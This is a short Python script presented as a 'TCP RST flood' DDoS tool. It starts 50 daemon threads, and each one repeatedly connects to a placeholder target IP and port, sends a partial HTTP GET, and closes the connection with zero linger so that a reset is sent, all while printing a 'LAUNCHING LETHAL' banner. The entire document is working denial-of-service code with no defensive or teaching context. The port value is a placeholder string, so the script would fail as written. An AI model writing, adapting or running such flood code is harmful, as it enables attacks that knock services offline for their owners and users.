import socket
import threading
import struct
import time

TARGET_IP = "IP"
TARGET_PORT = '''port'''

def tcp_rst_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            
            s.sendall(b"GET /target_website/ HTTP/1.1\r\n")
            

            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()
        except:
            pass

print("🚨 LAUNCHING LETHAL TCP RST FLOOD (DDoS SIGNATURE) 🚨")
print("Press Ctrl+C to stop.")

for i in range(50):
    t = threading.Thread(target=tcp_rst_flood)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)